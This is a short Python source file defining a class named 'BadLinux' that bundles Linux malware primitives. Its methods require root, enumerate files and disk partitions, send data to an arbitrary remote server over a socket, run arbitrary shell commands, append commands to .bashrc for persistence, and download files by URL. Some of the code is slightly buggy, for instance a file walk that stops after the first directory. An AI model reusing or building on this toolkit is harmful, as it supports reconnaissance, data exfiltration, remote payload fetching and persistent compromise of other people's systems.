import os
import psutil
import socket
import subprocess
import wget

class BadLinux(object):
    PATH_FILES = []
    PARTITIONS_NAME = []
    def __init__(self) -> None:
        if os.getuid() != 0:
            raise PermissionError("Plases Run As Root User")
    
    async def get_files(self , path : str = '.') -> list:
        try:
            for root , _ ,files in os.walk(path):
                _ = [self.PATH_FILES.append(os.path.join(root , file)) for file in files]
                return self.PATH_FILES
        except PermissionError:
            raise PermissionError("Memory could not be accessed")
        
        except:
            return [False]

    async def get_partitions(self) -> dict:
        for par in psutil.disk_partitions():
            self.PARTITIONS_NAME.append(
                {
                    'name':  par.device,
                     'mount': par.mountpoint,
                      'type':  par.fstype
                }
            )
        return self.PARTITIONS_NAME
    
    async def connect_to_server(self , server_address : str , port_address : str , data : bytes = None) -> socket.socket:
        sock = socket.socket()
        try:
            sock.connect((server_address , port_address))
            sock.send(data)
            return sock
        except Exception:
            raise Exception("Connection is not possible")    
        except:
            return False

    async def run_command(self , command : str) -> str:
        return subprocess.getoutput(command)

    async def add_in_shell(self , command : str) -> bool:
        with open(".bashrc" , 'a') as shell:
            shell.write(command)
        return True
    
    async def download_file(self , url : str) -> str:
        try:
            filename = wget.download(url)
            return os.path.join(os.getcwd() , filename)
        except ConnectionError:
            raise ConnectionError("Internet Disconnected, Please Check Connections")

        except Exception as e:
            raise Exception(f"Exception {e}")
    
    
